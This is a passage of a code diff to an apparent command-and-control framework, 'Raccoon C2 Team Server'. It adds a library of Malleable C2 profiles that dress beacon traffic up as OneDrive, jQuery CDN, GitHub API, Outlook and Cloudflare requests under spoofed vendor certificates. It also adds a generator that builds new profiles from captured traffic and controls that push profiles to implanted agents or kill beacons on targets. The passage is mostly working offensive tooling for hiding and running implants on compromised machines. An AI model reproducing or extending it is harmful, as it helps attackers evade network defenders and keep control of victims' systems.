+        }
+
+        output {
+            mask;
+            base64url;
+            print;
+        }
+    }
+
+    server {
+        header "Content-Type" "text/plain";
+        header "Access-Control-Allow-Origin" "*";
+
+        output {
+            mask;
+            base64;
+            print;
+        }
+    }
+}
+`},
+{name:"OneDrive Sync",icon:"\u{2601}",desc:"Mimics Microsoft OneDrive file sync and delta API patterns with Azure certificate.",tags:[["saas","t-saas"],["cdn","t-cdn"]],source:`# Microsoft OneDrive Sync Profile
+set sleeptime "55000";
+set jitter    "30";
+set useragent "Microsoft SkyDriveSync 24.125.0623.0001 ship; Windows NT 10.0 (22631)";
+set host_stage "false";
+
+https-certificate {
+    set CN   "onedrive.live.com";
+    set O    "Microsoft Corporation";
+    set C    "US";
+    set validity "365";
+}
+
+http-get {
+    set uri "/v1.0/me/drive/root/delta /v1.0/me/drive/recent /v1.0/me/drive/sharedWithMe";
+
+    client {
+        header "Accept" "application/json";
+        header "X-RequestStats" "SDK-Version=Graph-dotnet-2.0";
+
+        metadata {
+            base64url;
+            prepend "Bearer ";
+            header "Authorization";
+        }
+    }
+
+    server {
+        header "Content-Type" "application/json; odata.metadata=minimal";
+        header "request-id" "c9a7b3e1-f2d4-4a6c-8e0b-1d3f5a7c9e2b";
+        header "x-ms-ags-diagnostic" "{\\"ServerInfo\\":{\\"DataCenter\\":\\"West Europe\\"}}";
+
+        output {
+            mask;
+            base64;
+            prepend "{\\"@odata.context\\":\\"https://graph.microsoft.com/v1.0/$metadata#Collection(driveItem)\\",\\"value\\":[{\\"name\\":\\"";
+            append "\\"}]}";
+            print;
+        }
+    }
+}
+
+http-post {
+    set uri "/v1.0/me/drive/items/upload /v1.0/me/drive/root/children";
+
+    client {
+        header "Content-Type" "application/json";
+        header "X-ClientCorrelationId" "4e7f2a1b-3d8c-9e0f-6b5a";
+
+        id {
+            base64url;
+            header "X-RequestId";
+        }
+
+        output {
+            mask;
+            base64;
+            print;
+        }
+    }
+
+    server {
+        header "Content-Type" "application/json";
+
+        output {
+            mask;
+            base64;
+            prepend "{\\"id\\":\\"";
+            append "\\",\\"status\\":\\"uploaded\\"}";
+            print;
+        }
+    }
+}
+`},
+{name:"jQuery CDN",icon:"\u{1F4DC}",desc:"Classic CDN evasion profile disguised as jQuery and static asset requests. Widely used baseline.",tags:[["cdn","t-cdn"],["web","t-web"]],source:`# jQuery / Static Asset CDN Profile
+set sleeptime "60000";
+set jitter    "20";
+set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36";
+set host_stage "false";
+
+http-get {
+    set uri "/jquery-3.7.1.min.js /jquery-3.7.1.slim.min.js /jquery.min.map";
+
+    client {
+        header "Accept" "*/*";
+        header "Accept-Encoding" "gzip, deflate";
+        header "Referer" "https://code.jquery.com/";
+
+        metadata {
+            base64url;
+            prepend "__cfduid=";
+            header "Cookie";
+        }
+    }
+
+    server {
+        header "Content-Type" "application/javascript; charset=utf-8";
+        header "Cache-Control" "public, max-age=31536000";
+        header "X-Content-Type-Options" "nosniff";
+        header "Access-Control-Allow-Origin" "*";
+
+        output {
+            mask;
+            base64;
+            prepend "/*! jQuery v3.7.1 | (c) OpenJS Foundation | jquery.org/license */\\n!function(e,t){\\"use strict\\";";
+            append "\\n}(window);";
+            print;
+        }
+    }
+}
+
+http-post {
+    set uri "/npm/jquery@3.7.1 /ajax/libs/jquery/3.7.1/jquery.min.js";
+
+    client {
+        header "Content-Type" "application/octet-stream";
+        header "Origin" "https://cdnjs.cloudflare.com";
+
+        id {
+            base64url;
+            parameter "v";
+        }
+
+        output {
+            mask;
+            base64;
+            print;
+        }
+    }
+
+    server {
+        header "Content-Type" "application/javascript";
+
+        output {
+            mask;
+            base64;
+            print;
+        }
+    }
+}
+`},
+{name:"GitHub API",icon:"\u{1F419}",desc:"Disguises traffic as GitHub REST API calls for repository and gist operations.",tags:[["api","t-api"],["saas","t-saas"]],source:`# GitHub REST API Profile
+set sleeptime "40000";
+set jitter    "30";
+set useragent "GitHub-Hookshot/v1";
+set host_stage "false";
+
+https-certificate {
+    set CN   "api.github.com";
+    set O    "GitHub, Inc.";
+    set C    "US";
+    set validity "365";
+}
+
+http-get {
+    set uri "/repos/notifications /gists /user/repos";
+
+    client {
+        header "Accept" "application/vnd.github+json";
+        header "X-GitHub-Api-Version" "2022-11-28";
+
+        metadata {
+            base64url;
+            prepend "ghp_";
+            header "Authorization";
+        }
+    }
+
+    server {
+        header "Content-Type" "application/json; charset=utf-8";
+        header "X-RateLimit-Limit" "5000";
+        header "X-RateLimit-Remaining" "4987";
+        header "X-GitHub-Request-Id" "E4A2:1C3B:5F6D:7E8A:9B0C";
+
+        output {
+            mask;
+            base64;
+            prepend "[{\\"id\\":";
+            append ",\\"node_id\\":\\"MDQ6R2lzdA\\"}]";
+            print;
+        }
+    }
+}
+
+http-post {
+    set uri "/gists /repos/issues/comments";
+
+    client {
+        header "Content-Type" "application/json";
+        header "Accept" "application/vnd.github+json";
+
+        id {
+            base64url;
+            header "X-GitHub-Delivery";
+        }
+
+        output {
+            mask;
+            base64;
+            print;
+        }
+    }
+
+    server {
+        header "Content-Type" "application/json; charset=utf-8";
+
+        output {
+            mask;
+            base64;
+            prepend "{\\"id\\":\\"";
+            append "\\",\\"created_at\\":\\"2025-01-01T00:00:00Z\\"}";
+            print;
+        }
+    }
+}
+`},
+{name:"Outlook / O365",icon:"\u{1F4E7}",desc:"Emulates Microsoft Outlook Web and Exchange Online REST API traffic with OAuth tokens.",tags:[["saas","t-saas"],["api","t-api"]],source:`# Microsoft Outlook / Office 365 Profile
+set sleeptime "35000";
+set jitter    "25";
+set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0";
+set host_stage "false";
+
+https-certificate {
+    set CN   "outlook.office365.com";
+    set O    "Microsoft Corporation";
+    set C    "US";
+    set validity "365";
+}
+
+http-get {
+    set uri "/owa/service.svc /api/v2.0/me/mailfolders/inbox/messages /api/v2.0/me/calendarview";
+
+    client {
+        header "Accept" "application/json; odata.metadata=minimal";
+        header "X-OWA-CANARY" "sK9aL3mN7pQ2rT5u";
+        header "X-AnchorMailbox" "user@contoso.com";
+
+        metadata {
+            base64url;
+            prepend "Bearer eyJ0eXAi";
+            header "Authorization";
+        }
+    }
+
+    server {
+        header "Content-Type" "application/json; odata.metadata=minimal; odata.streaming=true";
+        header "X-CalculatedBETarget" "DM6PR12MB4567.namprd12.prod.outlook.com";
+        header "X-MS-Diagnostics" "1;FRA;EXCH";
+
+        output {
+            mask;
+            base64;
+            prepend "{\\"@odata.context\\":\\"https://outlook.office365.com/api/v2.0/$metadata#Me/Messages\\",\\"value\\":[{\\"Id\\":\\"";
+            append "\\"}]}";
+            print;
+        }
+    }
+}
+
+http-post {
+    set uri "/owa/service.svc?action=SendMessage /api/v2.0/me/sendmail";
+
+    client {
+        header "Content-Type" "application/json; charset=utf-8";
+        header "X-OWA-ActionId" "9f2e1d3c-4b5a-6c7d-8e9f";
+
+        id {
+            base64url;
+            header "X-OWA-CorrelationId";
+        }
+
+        output {
+            mask;
+            base64;
+            print;
+        }
+    }
+
+    server {
+        header "Content-Type" "application/json";
+
+        output {
+            mask;
+            base64;
+            print;
+        }
+    }
+}
+`},
+{name:"Cloudflare Workers",icon:"\u{26A1}",desc:"Blends with Cloudflare Workers edge compute and KV storage API traffic patterns.",tags:[["cdn","t-cdn"],["api","t-api"]],source:`# Cloudflare Workers Edge Profile
+set sleeptime "40000";
+set jitter    "30";
+set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36";
+set host_stage "false";
+
+https-certificate {
+    set CN   "workers.dev";
+    set O    "Cloudflare, Inc.";
+    set C    "US";
+    set validity "365";
+}
+
+http-get {
+    set uri "/cdn-cgi/trace /cdn-cgi/rum /api/kv/values";
+
+    client {
+        header "Accept" "application/json, text/plain, */*";
+        header "Accept-Encoding" "gzip, deflate, br";
+        header "CF-Connecting-IP" "203.0.113.42";
+
+        metadata {
+            base64url;
+            prepend "cf_clearance=";
+            header "Cookie";
+        }
+    }
+
+    server {
+        header "Content-Type" "application/json";
+        header "CF-RAY" "8a2b3c4d5e6f7g8h-FRA";
+        header "CF-Cache-Status" "DYNAMIC";
+        header "Server" "cloudflare";
+
+        output {
+            mask;
+            base64;
+            prepend "{\\"success\\":true,\\"result\\":\\"";
+            append "\\",\\"errors\\":[]}";
+            print;
+        }
+    }
+}
+
+http-post {
+    set uri "/api/kv/write /api/worker/invoke";
+
+    client {
+        header "Content-Type" "application/json";
+        header "CF-Worker" "production";
+
+        id {
+            base64url;
+            header "X-Request-Id";
+        }
+
+        output {
+            mask;
+            base64;
+            print;
+        }
+    }
+
+    server {
+        header "Content-Type" "application/json";
+        header "CF-RAY" "8a2b3c4d5e6f7g8h-FRA";
+
+        output {
+            mask;
+            base64;
+            prepend "{\\"success\\":true,\\"result\\":\\"";
+            append "\\"}";
+            print;
+        }
+    }
+}
+`}
+];
+
+function showC2Library(){
+  const ol = document.createElement("div");
+  ol.className = "c2pe-lib-overlay";
+  ol.onclick = e => { if(e.target===ol) ol.remove(); };
+  let cards = C2PE_LIBRARY.map((p,i) =>
+    `<div class="c2pe-lib-card" data-idx="${i}" data-name="${esc(p.name.toLowerCase())}" onclick="c2peLoadLib(${i})">
+       <h4><span class="lib-icon">${p.icon}</span> ${esc(p.name)}</h4>
+       <p>${esc(p.desc)}</p>
+       <div class="c2pe-lib-tags">${p.tags.map(t => `<span class="c2pe-lib-tag ${t[1]}">${t[0]}</span>`).join("")}</div>
+     </div>`
+  ).join("");
+  ol.innerHTML = `<div class="c2pe-lib-panel">
+    <button class="c2pe-lib-close" onclick="this.closest('.c2pe-lib-overlay').remove()">&#10005;</button>
+    <div class="c2pe-lib-hdr">
+      <h3>&#128218; Profile Library</h3>
+      <input type="text" placeholder="Search profiles..." oninput="c2peLibFilter(this.value)">
+    </div>
+    <div class="c2pe-lib-grid" id="c2pe-lib-grid">${cards}</div>
+  </div>`;
+  document.body.appendChild(ol);
+}
+
+function c2peLibFilter(q){
+  q = q.toLowerCase();
+  document.querySelectorAll(".c2pe-lib-card").forEach(c => {
+    c.style.display = c.dataset.name.includes(q) ? "" : "none";
+  });
+}
+
+function c2peLoadLib(idx){
+  const p = C2PE_LIBRARY[idx];
+  if(!p) return;
+  const ta = document.getElementById("c2pe-textarea");
+  if(!ta) return;
+  ta.value = p.source;
+  _c2ProfileSource = p.source;
+  ta.dispatchEvent(new Event("input"));
+  document.querySelector(".c2pe-lib-overlay")?.remove();
+  toast("ok","C2 Profile","Loaded: "+p.name,3000);
+}
+
+function showBurpImport(){
+  const overlay = document.createElement("div");
+  overlay.className = "burp-overlay";
+  overlay.onclick = e => { if(e.target===overlay) overlay.remove(); };
+  overlay.innerHTML = `
+<div class="burp-panel">
+  <button class="loot-close" onclick="this.closest('.burp-overlay').remove()" style="position:absolute;top:8px;right:12px;background:none;border:none;color:var(--text2);font-size:18px;cursor:pointer">&#10005;</button>
+  <h3>&#128270; Import from Burp Suite</h3>
+  <p style="font-size:11px;color:var(--text2);margin:0 0 12px">Paste a raw HTTP request and its response from Burp Suite, ZAP, or any proxy. A Malleable C2 profile will be generated that mimics this traffic pattern.</p>
+
+  <div class="burp-row">
+    <div class="burp-col">
+      <label>HTTP Request (raw)</label>
+      <textarea id="burp-req" placeholder="GET /api/v2/telemetry HTTP/1.1\nHost: analytics.example.com\nAccept: application/json\nCookie: session=abc123\n\n"></textarea>
+    </div>
+    <div class="burp-col">
+      <label>HTTP Response (raw, optional)</label>
+      <textarea id="burp-res" placeholder="HTTP/1.1 200 OK\nContent-Type: application/json\nCache-Control: no-cache\n\n{&quot;status&quot;:&quot;ok&quot;,&quot;data&quot;:[]}"></textarea>
+    </div>
+  </div>
+
+  <div class="burp-section">Beacon Data Placement</div>
+  <div class="burp-opts">
+    <div>
+      <label>Metadata (http-get)</label>
+      <select id="burp-meta-loc">
+        <option value="header" selected>Header</option>
+        <option value="parameter">URL Parameter</option>
+        <option value="body">Body (POST only)</option>
+      </select>
+      <input id="burp-meta-name" value="Cookie" placeholder="Header/param name" style="margin-top:4px">
+    </div>
+    <div>
+      <label>Beacon ID (http-post)</label>
+      <select id="burp-id-loc">
+        <option value="parameter" selected>URL Parameter</option>
+        <option value="header">Header</option>
+        <option value="body">Body</option>
+      </select>
+      <input id="burp-id-name" value="sid" placeholder="Header/param name" style="margin-top:4px">
+    </div>
+    <div>
+      <label>Encoding</label>
+      <select id="burp-enc">
+        <option value="base64url" selected>base64url</option>
+        <option value="base64">base64</option>
+        <option value="netbios">netbios</option>
+        <option value="netbiosu">netbiosu</option>
+      </select>
+    </div>
+  </div>
+
+  <div class="burp-actions">
+    <button onclick="this.closest('.burp-overlay').remove()">Cancel</button>
+    <button class="burp-generate" onclick="burpGenerate()">&#9889; Generate Profile</button>
+  </div>
+</div>`;
+  document.body.appendChild(overlay);
+}
+
+async function burpGenerate(){
+  const req = document.getElementById("burp-req")?.value || "";
+  const res = document.getElementById("burp-res")?.value || "";
+  if(!req.trim()){ toast("warn","Burp Import","Paste a raw HTTP request",3000); return; }
+  const enc = document.getElementById("burp-enc")?.value || "base64url";
+  try{
+    const data = await api("/api/server/c2-profile/from-burp", {
+      method:"POST",
+      body:JSON.stringify({
+        request: req,
+        response: res,
+        metadata_location: document.getElementById("burp-meta-loc")?.value || "header",
+        metadata_name: document.getElementById("burp-meta-name")?.value || "Cookie",
+        metadata_encoding: enc,
+        id_location: document.getElementById("burp-id-loc")?.value || "parameter",
+        id_name: document.getElementById("burp-id-name")?.value || "sid",
+        id_encoding: enc,
+        output_encoding: enc,
+      })
+    });
+    if(data.error){ toast("err","Burp Import",data.error,4000); return; }
+    const ta = document.getElementById("c2pe-textarea");
+    if(ta){
+      ta.value = data.profile;
+      _c2ProfileSource = data.profile;
+      ta.dispatchEvent(new Event("input"));
+    }
+    document.querySelector(".burp-overlay")?.remove();
+    toast("ok","Burp Import",`Profile generated from ${data.method} ${data.uri} (${data.headers_count} headers, ${data.params_count} params)`,5000);
+  }catch(e){
+    toast("err","Burp Import","Failed: "+e.message,4000);
+  }
 }
 
 // ── Netstat view ──
@@ -3612,12 +5544,133 @@ async function showBeaconConfig(){
         </div>
       </div>
       <div style="margin-top:24px">
+        <div class="t-info" style="margin-bottom:12px">&#128737; C2 Profile</div>
+        <div id="cfg-agent-profile" style="margin-bottom:14px"></div>
+        <div style="border-top:1px solid rgba(255,255,255,0.06);padding-top:12px;margin-bottom:8px">
+          <div style="color:var(--text2);font-size:11px;margin-bottom:8px;font-weight:600">Push New Profile</div>
+          <div id="cfg-profile-status" style="font-size:11px;color:var(--text2);margin-bottom:8px"></div>
+          <div style="display:flex;gap:10px;align-items:center;margin-bottom:8px">
+            <label style="color:var(--text2);font-size:12px;width:70px">Profile</label>
+            <select id="cfg-profile-select" style="flex:1;background:rgba(0,0,0,0.5);border:1px solid var(--border);border-radius:4px;padding:6px 10px;color:var(--text);font-family:var(--mono);font-size:12px">
+              <option value="active">Active server profile</option>
+            </select>
+          </div>
+          <div style="display:flex;gap:8px;margin-top:8px;flex-wrap:wrap">
+            <button onclick="pushProfileToAgent()" style="padding:8px 16px;background:rgba(197,134,192,0.15);color:#c586c0;border:1px solid rgba(197,134,192,0.4);border-radius:5px;cursor:pointer;font-size:12px;font-family:var(--sans)">&#128225; Push to this Agent</button>
+            <button onclick="pushProfileToAll()" style="padding:8px 16px;background:rgba(255,26,26,0.08);color:var(--red);border:1px solid rgba(255,26,26,0.3);border-radius:5px;cursor:pointer;font-size:12px;font-family:var(--sans)">&#128225; Push to All</button>
+            <button onclick="showC2ProfileEditor()" style="padding:8px 16px;background:rgba(255,255,255,0.06);color:var(--text);border:1px solid var(--border);border-radius:5px;cursor:pointer;font-size:12px;font-family:var(--sans)">&#9998; Editor</button>
+          </div>
+        </div>
+      </div>
+      <div style="margin-top:24px">
         <div class="t-info" style="margin-bottom:8px">&#128163; Kill Agent</div>
         <div style="color:var(--text2);font-size:11px;margin-bottom:10px">Terminate the beacon process on the target.</div>
         <button onclick="if(confirm('Kill agent '+selectedAgent+'?'))quickCmd('kill','')" style="padding:8px 20px;background:#661111;color:#ff6666;border:1px solid #882222;border-radius:5px;cursor:pointer;font-size:12px;font-family:var(--sans)">Kill Beacon</button>
       </div>
     </div>
   `);
+  // Show agent's current profile from beacon telemetry
+  const ap = document.getElementById("cfg-agent-profile");
+  if(ap){
+    const prof = info.c2_profile;
+    if(prof && prof.active){
+      const tbl = (label, val) => '<div style="display:flex;gap:6px;padding:2px 0;font-size:11px"><span style="color:var(--text2);min-width:90px">'+label+'</span><span style="color:var(--text);word-break:break-all">'+esc(String(val))+'</span></div>';
+      const tagList = (items, color) => items.map(i => '<span style="display:inline-block;font-size:9px;padding:1px 6px;border-radius:3px;background:rgba('+color+',0.12);color:rgba('+color+',1);margin:1px 2px">'+esc(i)+'</span>').join("");
+      let html = '<div style="background:rgba(197,134,192,0.06);border:1px solid rgba(197,134,192,0.2);border-radius:6px;padding:10px 12px">';
+      html += '<div style="font-size:11px;font-weight:600;color:#c586c0;margin-bottom:6px">&#10004; Agent Profile Active</div>';
+      if(prof.useragent) html += tbl("User-Agent", prof.useragent);
+      html += tbl("Interval", prof.interval+"s");
+      html += tbl("Jitter", prof.jitter+"%");
+      if(prof.get_uris && prof.get_uris.length){
+        html += '<div style="padding:4px 0 2px;font-size:10px;color:var(--text2);font-weight:600">GET URIs</div>';
+        html += tagList(prof.get_uris, "86,156,198");
+      }
+      if(prof.post_uris && prof.post_uris.length){
+        html += '<div style="padding:4px 0 2px;font-size:10px;color:var(--text2);font-weight:600">POST URIs</div>';
+        html += tagList(prof.post_uris, "206,145,120");
+      }
+      if(prof.get_headers && prof.get_headers.length){
+        html += '<div style="padding:4px 0 2px;font-size:10px;color:var(--text2);font-weight:600">GET Headers</div>';
+        html += tagList(prof.get_headers, "78,201,176");
+      }
+      if(prof.post_headers && prof.post_headers.length){
+        html += '<div style="padding:4px 0 2px;font-size:10px;color:var(--text2);font-weight:600">POST Headers</div>';
+        html += tagList(prof.post_headers, "78,201,176");
+      }
+      if(prof.metadata_config){
+        const mc = prof.metadata_config;
+        let mstr = (mc.transforms||[]).join(" → ");
+        if(mc.prepend) mstr += ' prepend="'+mc.prepend+'"';
+        if(mc.terminator) mstr += " → "+mc.terminator.type+(mc.terminator.name?" "+mc.terminator.name:"");
+        if(mstr) html += tbl("Metadata", mstr);
+      }
+      if(prof.id_config){
+        const ic = prof.id_config;
+        let istr = (ic.transforms||[]).join(" → ");
+        if(ic.terminator) istr += " → "+ic.terminator.type+(ic.terminator.name?" "+ic.terminator.name:"");
+        if(istr) html += tbl("Beacon ID", istr);
+      }
+      html += '</div>';
+      ap.innerHTML = html;
+    } else {
+      ap.innerHTML = '<div style="font-size:11px;color:var(--orange);padding:8px 0">&#9888; No C2 profile active on this agent — using default random evasion headers</div>';
+    }
+  }
+  // Show last raw HTTP request from this beacon (proof that profile is applied)
+  const lr = info._last_request;
+  if(lr && ap){
+    const tbl = (label, val) => '<div style="display:flex;gap:6px;padding:2px 0;font-size:11px"><span style="color:var(--text2);min-width:90px">'+label+'</span><span style="color:var(--text);word-break:break-all;font-family:monospace">'+esc(String(val))+'</span></div>';
+    let rhtml = '<div style="background:rgba(86,156,198,0.06);border:1px solid rgba(86,156,198,0.2);border-radius:6px;padding:10px 12px;margin-top:10px">';
+    rhtml += '<div style="font-size:11px;font-weight:600;color:#569cd6;margin-bottom:6px">&#128225; Last Beacon HTTP Request</div>';
+    rhtml += tbl("Path", lr.path);
+    rhtml += tbl("User-Agent", lr.user_agent);
+    rhtml += tbl("Time", lr.ts);
+    if(lr.headers){
+      const skip = new Set(["User-Agent","Content-Type"]);
+      const extra = Object.entries(lr.headers).filter(([k])=>!skip.has(k));
+      if(extra.length){
+        rhtml += '<div style="padding:4px 0 2px;font-size:10px;color:var(--text2);font-weight:600">Custom Headers</div>';
+        extra.forEach(([k,v])=>{ rhtml += tbl(k, v); });
+      }
+    }
+    const profActive = info.c2_profile && info.c2_profile.active;
+    const isProfilePath = lr.path && !lr.path.startsWith("/beacon") && !lr.path.startsWith("/api/beacon") && lr.path !== "/";
+    const isProfileUA = lr.user_agent && lr.user_agent.includes("Slackbot") || (lr.user_agent && !["Mozilla","python-urllib"].some(s=>lr.user_agent.includes(s)));
+    if(profActive && isProfilePath){
+      rhtml += '<div style="margin-top:8px;padding:6px 10px;background:rgba(78,201,120,0.1);border:1px solid rgba(78,201,120,0.25);border-radius:4px;font-size:10px;color:#4ec978">&#10004; Profile is actively applied — beacon is using C2 profile URI <b>'+esc(lr.path)+'</b> instead of default paths</div>';
+    } else if(profActive){
+      rhtml += '<div style="margin-top:8px;padding:6px 10px;background:rgba(206,145,50,0.1);border:1px solid rgba(206,145,50,0.25);border-radius:4px;font-size:10px;color:#ce9132">&#9888; Profile is configured but request path looks like a default — check if beacon received the profile</div>';
+    }
+    rhtml += '</div>';
+    ap.innerHTML += rhtml;
+  }
+  // Populate server profile status
+  api("/api/server/c2-profile/active").then(d => {
+    const status = document.getElementById("cfg-profile-status");
+    if(status){
+      if(d.active){
+        const cfg = d.config||{};
+        const nGet = (cfg.http_get?.uris||[]).length;
+        const nPost = (cfg.http_post?.uris||[]).length;
+        let s = '<span style="color:var(--green)">&#10004; Ready to push</span>';
+        if(cfg.useragent) s += ' — '+esc(cfg.useragent.substring(0,50));
+        if(nGet||nPost) s += ' ('+nGet+' GET, '+nPost+' POST)';
+        status.innerHTML = s;
+      } else {
+        status.innerHTML = '<span style="color:var(--text2)">No server profile saved — open the editor first</span>';
+      }
+    }
+  }).catch(()=>{});
+  // Populate library dropdown
+  const sel = document.getElementById("cfg-profile-select");
+  if(sel && typeof C2PE_LIBRARY !== "undefined"){
+    C2PE_LIBRARY.forEach((p,i) => {
+      const opt = document.createElement("option");
+      opt.value = i;
+      opt.textContent = p.icon+" "+p.name;
+      sel.appendChild(opt);
+    });
+  }
 }
 
 function applySleepConfig(){
@@ -3637,6 +5690,67 @@ function removePersist(){
   const method = document.getElementById("cfg-persist-method").value;
   quickCmd("unpersist", method, "Unpersist");
   toast("warning","Persistence","Removing via "+method+"...",3000);
+}
+
+async function pushProfileToAgent(){
+  if(!selectedAgent) return;
+  const sel = document.getElementById("cfg-profile-select");
+  const val = sel ? sel.value : "active";
+  if(val === "active"){
+    try{
+      const check = await api("/api/server/c2-profile/active");
+      if(!check.active){
+        toast("warn","C2 Profile","No active profile — open the editor and save one first",4000);
+        return;
+      }
+      const data = await api("/api/server/c2-profile/push",{
+        method:"POST", body:JSON.stringify({agent_ids:[selectedAgent]})
+      });
+      if(data.error){ toast("err","C2 Profile",data.error,4000); return; }
+      toast("ok","C2 Profile","Profile pushed to "+selectedAgent,3000);
+    }catch(e){ toast("err","C2 Profile","Push failed: "+e.message,4000); }
+  } else {
+    const lib = typeof C2PE_LIBRARY !== "undefined" ? C2PE_LIBRARY : [];
+    const profile = lib[parseInt(val)];
+    if(!profile) return;
+    try{
+      const saveResp = await api("/api/server/c2-profile/save",{
+        method:"POST", body:JSON.stringify({source: profile.source})
+      });
+      if(saveResp.error){ toast("err","C2 Profile",saveResp.error,4000); return; }
+      const data = await api("/api/server/c2-profile/push",{
+        method:"POST", body:JSON.stringify({agent_ids:[selectedAgent]})
+      });
+      toast("ok","C2 Profile","Pushed '"+profile.name+"' to "+selectedAgent,3000);
+    }catch(e){ toast("err","C2 Profile","Push failed: "+e.message,4000); }
+  }
+}
+
+async function pushProfileToAll(){
+  try{
+    const sel = document.getElementById("cfg-profile-select");
+    const val = sel ? sel.value : "active";
+    if(val !== "active"){
+      const lib = typeof C2PE_LIBRARY !== "undefined" ? C2PE_LIBRARY : [];
+      const profile = lib[parseInt(val)];
+      if(profile){
+        await api("/api/server/c2-profile/save",{
+          method:"POST", body:JSON.stringify({source: profile.source})
+        });
+      }
+    }
+    const check = await api("/api/server/c2-profile/active");
+    if(!check.active){
+      toast("warn","C2 Profile","No active profile — save one first",4000);
+      return;
+    }
+    if(!confirm("Push C2 profile to ALL connected agents?")) return;
+    const data = await api("/api/server/c2-profile/push",{
+      method:"POST", body:JSON.stringify({})
+    });
+    if(data.error){ toast("err","C2 Profile",data.error,4000); return; }
+    toast("ok","C2 Profile","Profile pushed to "+data.count+" agent(s)",3000);
+  }catch(e){ toast("err","C2 Profile","Push failed: "+e.message,4000); }
 }
 
 // ── Log viewers ──
@@ -4877,22 +6991,30 @@ def main():
     }
     app = create_app(crypto, operator_token, data_dir, server_config=srv_config)
 
-    print()
-    print("=" * 60)
-    print("  🦝 Raccoon C2 Team Server")
-    print("=" * 60)
-    print(f"  Listen:   {'https' if args.ssl else 'http'}://{args.host}:{args.port}")
-    print(f"  Token:    {operator_token}")
-    print(f"  Data:     {data_dir}")
-    print(f"  Key:      {'explicit' if args.key else 'derived' if args.derive_key else 'DEFAULT (insecure!)'}")
-    print("=" * 60)
-    print()
+    banner = (
+        f"\n{'=' * 60}\n"
+        f"  Raccoon C2 Team Server\n"
+        f"{'=' * 60}\n"
+        f"  Listen:   {'https' if args.ssl else 'http'}://{args.host}:{args.port}\n"
+        f"  Token:    {operator_token}\n"
+        f"  Data:     {data_dir}\n"
+        f"  Key:      {'explicit' if args.key else 'derived' if args.derive_key else 'DEFAULT (insecure!)'}\n"
+        f"{'=' * 60}\n"
+    )
+    try:
+        print(banner)
+    except UnicodeEncodeError:
+        print(banner.encode("ascii", errors="replace").decode())
 
     ssl_ctx = None
     if args.ssl:
         if args.cert and args.certkey:
             ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
             ssl_ctx.load_cert_chain(args.cert, args.certkey)
+            keylog = os.environ.get("SSLKEYLOGFILE")
+            if keylog and hasattr(ssl_ctx, "keylog_filename"):
+                ssl_ctx.keylog_filename = keylog
+                logger.info("TLS keylog → %s", keylog)
         else:
             ssl_ctx = "adhoc"
             logger.info("Using self-signed certificate (install pyopenssl: pip install pyopenssl)")
